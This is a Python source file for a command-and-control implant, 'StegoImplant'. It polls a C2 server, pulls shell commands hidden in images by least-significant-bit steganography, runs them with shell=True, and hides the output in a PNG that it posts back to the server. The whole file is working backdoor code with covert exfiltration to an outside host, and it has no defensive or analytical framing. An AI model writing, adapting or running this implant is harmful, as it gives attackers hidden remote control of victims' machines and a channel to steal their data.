#!/usr/bin/env python3
import logging
import requests
import time
import os
import subprocess
import sys
from PIL import Image
import io
import base64

# --- Implant Configuration ---
C2_URL = "http://{C2_HOST}:{C2_PORT}"
POLL_INTERVAL = 10 # in seconds
OUTPUT_IMAGE = '/tmp/stego_implant_output.png'

# --- Embedded Assets ---
INPUT_IMAGE_DATA = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=')

# --- Add Project Root to Path ---
def find_project_root(start_path):
    current_path = os.path.abspath(start_path)
    while True:
        if os.path.exists(os.path.join(current_path, 'main.py')):
            return current_path
        parent_path = os.path.dirname(current_path)
        if parent_path == current_path:
            return None
        current_path = parent_path

project_root = find_project_root(os.path.dirname(__file__))
if project_root:
    sys.path.append(project_root)
    from modules.steganography import encode_image, decode_image
else:
    # --- Fallback Steganography Functions ---
    def encode_image(image_data, text, output_path):
        # This is a simplified version for the standalone implant.
        img = Image.open(io.BytesIO(image_data))
        encoded = img.copy()
        width, height = img.size
        index = 0
        text += "\\0" # Null terminator
        text_bin = ''.join(format(ord(c), '08b') for c in text)

        for row in range(height):
            for col in range(width):
                if index < len(text_bin):
                    pixel = list(img.getpixel((col, row)))
                    for n in range(3): # R, G, B
                        if index < len(text_bin):
                            pixel[n] = pixel[n] & ~1 | int(text_bin[index])
                            index += 1
                    encoded.putpixel((col, row), tuple(pixel))
        encoded.save(output_path)

    def decode_image(image_path):
        img = Image.open(image_path)
        binary_data = ""
        for row in range(img.height):
            for col in range(img.width):
                pixel = img.getpixel((col, row))
                for n in range(3):
                    binary_data += str(pixel[n] & 1)

        all_bytes = [binary_data[i: i+8] for i in range(0, len(binary_data), 8)]
        decoded_text = ""
        for byte in all_bytes:
            char_code = int(byte, 2)
            if char_code == 0: # Null terminator
                break
            decoded_text += chr(char_code)
        return decoded_text

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return str(e)

def run_implant(c2_host, c2_port):
    """
    The main loop for the steganographic implant.
    """
    logging.info("StegoImplant started.")
    c2_full_url = C2_URL.format(C2_HOST=c2_host, C2_PORT=c2_port)

    while True:
        try:
            # Get command from C2
            response = requests.get(f"{c2_full_url}/implant/get_command")
            if response.status_code == 200:
                command = decode_image(io.BytesIO(response.content))
                logging.info(f"Received command: {command}")

                output = execute_command(command)

                # Encode and send output
                encode_image(INPUT_IMAGE_DATA, output, OUTPUT_IMAGE)
                with open(OUTPUT_IMAGE, 'rb') as f:
                    files = {'file': f}
                    requests.post(f"{c2_full_url}/implant/send_output", files=files)
                logging.info("Sent output to C2.")

        except requests.exceptions.RequestException as e:
            logging.error(f"Failed to connect to C2: {e}")
        except Exception as e:
            logging.error(f"An error occurred in the implant: {e}")

        time.sleep(POLL_INTERVAL)

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 stego_implant.py <c2_host> <c2_port>")
        sys.exit(1)

    c2_host = sys.argv[1]
    c2_port = sys.argv[2]

    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    print("Starting StegoImplant...")
    run_implant(c2_host, c2_port)

if __name__ == "__main__":
    main()
